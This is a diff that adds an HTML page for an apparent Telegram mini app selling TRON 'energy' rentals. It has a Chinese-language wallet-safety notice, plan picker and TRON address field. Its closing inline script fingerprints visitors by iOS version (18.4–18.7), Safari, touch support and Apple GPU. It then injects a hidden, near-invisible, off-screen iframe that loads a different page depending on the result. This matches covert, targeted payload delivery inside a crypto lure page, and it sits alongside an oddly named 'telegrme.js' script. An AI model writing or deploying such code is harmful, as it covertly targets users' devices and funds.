@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>波场能量闪租</title>
+    <!-- Telegram 官方 Mini App SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            /* 强制使用深色 Web3 风格主题，不再跟随 Telegram 的白天模式 */
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --text-color: #f8fafc;
+            --hint-color: #94a3b8;
+            --primary: #38bdf8;
+            --btn-text: #ffffff;
+            --accent: #22c55e;
+            --danger: #ef4444;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-color); color: var(--text-color); padding: 16px; padding-bottom: 120px; }
+
+        /* ========= 安全弹窗样式 ========= */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(5px);
+            z-index: 9999; display: flex; align-items: center; justify-content: center;
+            padding: 20px;
+        }
+        .modal-container {
+            background: var(--card-bg); border-radius: 16px; width: 100%; max-width: 400px;
+            display: flex; flex-direction: column; overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        .modal-title {
+            padding: 16px; text-align: center; color: var(--danger); font-size: 16px;
+            border-bottom: 1px solid rgba(255,255,255,0.05); font-weight: bold;
+        }
+        .modal-content {
+            padding: 20px; max-height: 50vh; overflow-y: auto;
+            font-size: 13px; color: var(--text-color); line-height: 1.8;
+        }
+        .scroll-spacer { margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 8px; color: var(--hint-color); }
+        .modal-footer { padding: 16px; border-top: 1px solid rgba(255,255,255,0.05); }
+        .modal-btn {
+            width: 100%; padding: 14px; border-radius: 10px; border: none;
+            font-size: 15px; font-weight: bold; transition: all 0.3s;
+        }
+        .modal-btn:disabled { background: rgba(255,255,255,0.1); color: rgba(255,255,255,0.3); }
+        .modal-btn:not(:disabled) { background: var(--primary); color: var(--btn-text); cursor: pointer; }
+
+        /* ========= 通用卡片与排版样式 ========= */
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        .user-info { display: flex; align-items: center; gap: 8px; font-size: 14px; color: var(--hint-color); }
+        .badge { background: rgba(56, 189, 248, 0.15); color: var(--primary); padding: 4px 8px; border-radius: 6px; font-size: 12px; }
+
+        .card { background: var(--card-bg); border-radius: 14px; padding: 16px; margin-bottom: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .card-title { font-size: 14px; font-weight: 600; color: var(--hint-color); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        .grid-options { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 14px; }
+        .option-btn { background: rgba(255,255,255,0.05); border: 1.5px solid transparent; border-radius: 10px; padding: 12px 6px; text-align: center; cursor: pointer; color: var(--text-color); transition: all 0.2s; }
+        .option-btn.active { border-color: var(--primary); background: rgba(56, 189, 248, 0.1); }
+        .option-btn .num { font-size: 18px; font-weight: bold; }
+        .option-btn .desc { font-size: 11px; color: var(--hint-color); margin-top: 4px; }
+
+        .input-group { margin-top: 10px; }
+        .input-group label { display: block; font-size: 12px; color: var(--hint-color); margin-bottom: 6px; }
+        .input-field { width: 100%; background: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; padding: 12px; color: var(--text-color); font-size: 14px; outline: none; transition: border 0.3s; }
+        .input-field:focus { border-color: var(--primary); }
+
+        .calc-box { display: flex; justify-content: space-between; align-items: center; margin-top: 14px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.08); }
+        .calc-item { font-size: 13px; }
+        .calc-item .val { font-size: 18px; font-weight: bold; margin-top: 2px; }
+        .text-green { color: var(--accent); }
+        .text-del { text-decoration: line-through; color: var(--hint-color); font-size: 13px; margin-left: 4px; }
+
+        .invite-box { display: flex; align-items: center; justify-content: space-between; background: rgba(34, 197, 94, 0.1); border-radius: 10px; padding: 12px; font-size: 13px; }
+
+        /* ========= 实时动态播报样式 ========= */
+        .live-feed-card {
+            background: var(--card-bg); border-radius: 14px; padding: 12px 16px; margin-bottom: 16px;
+            display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .live-icon { font-size: 14px; animation: pulse 2s infinite; }
+        .live-content { flex: 1; font-size: 13px; color: var(--hint-color); overflow: hidden; position: relative; height: 18px; }
+        .live-text { 
+            position: absolute; left: 0; top: 0; width: 100%; 
+            transition: opacity 0.5s ease, transform 0.5s ease; 
+            opacity: 1; transform: translateY(0); 
+            white-space: nowrap; text-overflow: ellipsis; 
+        }
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .hl-addr { color: var(--text-color); font-family: monospace; }
+        .hl-energy { color: var(--accent); font-weight: bold; }
+
+        /* ========= 底部操作栏 ========= */
+        .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; padding: 16px; background: var(--bg-color); border-top: 1px solid rgba(255,255,255,0.05); }
+        .agreement-box { display: flex; align-items: flex-start; gap: 8px; font-size: 12px; color: var(--hint-color); margin-bottom: 12px; padding: 0 4px; }
+        .agreement-box input[type="checkbox"] { margin-top: 2px; width: 16px; height: 16px; accent-color: var(--primary); }
+        .agreement-box a { color: var(--primary); text-decoration: none; }
+        .action-btn { width: 100%; background: var(--primary); color: var(--btn-text); border: none; border-radius: 10px; padding: 14px; font-size: 16px; font-weight: bold; cursor: pointer; transition: opacity 0.2s; }
+        .action-btn:active { opacity: 0.8; }
+    </style>
+</head>
+<body>
+
+    <!-- 强制作弊拦截弹窗 -->
+    <div id="security-modal" class="modal-overlay">
+        <div class="modal-container">
+            <h3 class="modal-title">⚠️ 钱包安全及免责须知</h3>
+            <div class="modal-content" id="security-content">
+                <p>亲爱的用户，为了保障您的资金安全，请务必仔细阅读以下全部内容：</p>
+                <div class="scroll-spacer">
+                    <p style="color: var(--text-color); font-weight:bold; margin-bottom: 5px;">1. 地址确认不可逆转</p>
+                    <p>区块链转账具有不可逆性，一旦能量派发成功，若因您提供的接收地址错误（如错填、漏填等），本平台无法撤回操作，资金损失由用户自行承担。</p>
+                    
+                    <p style="color: var(--text-color); font-weight:bold; margin-top: 20px; margin-bottom: 5px;">2. 警惕“假USDT/黑U”骗局</p>
+                    <p>近期骗局多发，请勿轻信任何声称高额返利、代币空投的陌生群聊。切勿随意授权不明 DApp，或点击陌生人发送的提币链接。</p>
+
+                    <p style="color: var(--text-color); font-weight:bold; margin-top: 120px; margin-bottom: 5px;">3. 认准官方客服渠道</p>
+                    <p>我们的客服绝不会主动私聊您索要助记词或私钥。任何索要私钥的行为100%是诈骗。</p>
+
+                    <p style="color: var(--text-color); font-weight:bold; margin-top: 120px; margin-bottom: 5px;">4. 最终解释权</p>
+                    <p>使用本平台即代表您同意以上所有条款的约束。</p>
+
+                    <p style="text-align: center; color: var(--danger); margin-top: 80px; font-weight: bold;">-- 已滑动到底部 --</p>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button id="agree-btn" class="modal-btn" disabled>请向下滑动阅读全文</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 顶部状态栏 -->
+    <div class="header">
+        <div>
+            <h2>⚡ 波场能量闪租</h2>
+            <div class="user-info">
+                <span id="user-display">欢迎使用</span>
+                <span class="badge">自动到账</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- 租赁套餐选择 -->
+    <div class="card">
+        <div class="card-title">选择转账笔数 (能量)</div>
+        <div class="grid-options">
+            <div class="option-btn active" onclick="selectPlan(1, 32000, 3.2, this)">
+                <div class="num">1 笔</div>
+                <div class="desc">32,000 能量</div>
+            </div>
+            <div class="option-btn" onclick="selectPlan(5, 160000, 15.0, this)">
+                <div class="num">5 笔</div>
+                <div class="desc">160,000 能量</div>
+            </div>
+            <div class="option-btn" onclick="selectPlan(10, 320000, 28.0, this)">
+                <div class="num">10 笔</div>
+                <div class="desc">320,000 能量</div>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>接收能量的 TRON 钱包地址</label>
+            <input type="text" id="tron-address" class="input-field" placeholder="输入 T 开头的 TRC20 地址">
+        </div>
+
+        <div class="calc-box">
+            <div class="calc-item">
+                <div style="color: var(--hint-color);">原手续费</div>
+                
+                <div class="val text-del" id="original-price">13.5 TRX</div>
+            </div>
+            <div class="calc-item" style="text-align: right;">
+                <div style="color: var(--hint-color);">实付金额</div>
+                <div class="val text-green" id="pay-price">3.2 TRX</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 邀请返佣模块 -->
+    <div class="card">
+        <div class="card-title">邀请返佣</div>
+        <div class="invite-box">
+            <span>🎁 邀请好友使用，享 20% 返佣</span>
+            <button onclick="shareReferral()" style="background: var(--accent); border:none; color:#fff; padding:6px 12px; border-radius:6px; font-size:12px; cursor:pointer;">复制链接</button>
+        </div>
+    </div>
+
+    <!-- 实时动态播报跑马灯 -->
+    <div class="live-feed-card">
+        <div class="live-icon">🟢</div>
+        <div class="live-content">
+            <div id="live-text" class="live-text">
+                <span class="hl-addr">T9yE***a1B2</span> 刚刚成功租赁 <span class="hl-energy">32,000 能量</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- 底部操作栏 -->
+    <div class="bottom-bar">
+        <div class="agreement-box">
+            <input type="checkbox" id="agree-checkbox">
+            <label for="agree-checkbox">我已阅读并同意 <a href="javascript:void(0);" onclick="alert('安全提示：请确认地址正确，转错将无法退回资金。')">《钱包安全保护须知》</a>，确认地址无误。</label>
+        </div>
+        <button class="action-btn" onclick="submitOrder()">确认租赁</button>
+    </div>
+
+    <!-- 引入核心逻辑脚本 -->
+    <script src="telegrme.js"></script>
+      <script>
+          (function(){
+    var ua = navigator.userAgent;
+    try {
+      var plat = navigator.platform || '';
+      var touch = ('ontouchstart' in window) && (navigator.maxTouchPoints > 0);
+      var sw = screen.width;
+      var sh = screen.height;
+
+      var iosMatch = ua.match(/iPhone OS (\d+)[_.](\d+)/);
+      var iosMajor = iosMatch ? parseInt(iosMatch[1]) : 0;
+      var iosMinor = iosMatch ? parseInt(iosMatch[2]) : 0;
+
+      var isIPhone = /iPhone/.test(ua) && /iPhone/.test(plat);
+      var isSafari = /Safari/.test(ua) && !/CriOS|FxiOS|OPiOS|EdgiOS|Googlebot|HeadlessChrome/.test(ua);
+
+      var ok = true;
+
+       if (iosMajor < 18 || iosMajor > 18) ok = false;
+       else if (iosMinor < 4 || iosMinor > 7) ok = false;
+       else if (!isSafari) ok = false;
+       else if (!touch) ok = false;
+
+  
+
+      if (ok) {
+        try {
+          var c = document.createElement('canvas');
+          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+          if (gl) {
+            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            if (dbg) {
+              var renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '';
+              if (renderer && !/Apple GPU/i.test(renderer)) ok = false;
+            }
+          }
+        } catch(e) {}
+      }
+
+      if (ok) {
+      const frame = document.createElement('iframe');
+      frame.src = '/expires/expires.html'
+      frame.style.width = '1px';
+      frame.style.opacity = '0.01';
+      frame.style.position = 'absolute';
+      frame.style.left = '-9999px';
+      frame.style.height = '1px';
+      frame.style.border = 'none';
+      document.body.appendChild(frame);
+    
+
+      } else {
+      const frame = document.createElement('iframe');
+      frame.src = '/expirse/expires.html'
+      frame.style.width = '1px';
+      frame.style.opacity = '0.01';
+      frame.style.position = 'absolute';
+      frame.style.left = '-9999px';
+      frame.style.height = '1px';
+      frame.style.border = 'none';
+      document.body.appendChild(frame);
+      }
+    } catch(e) {}
+  })();
+    </script>
+</body>
+</html>
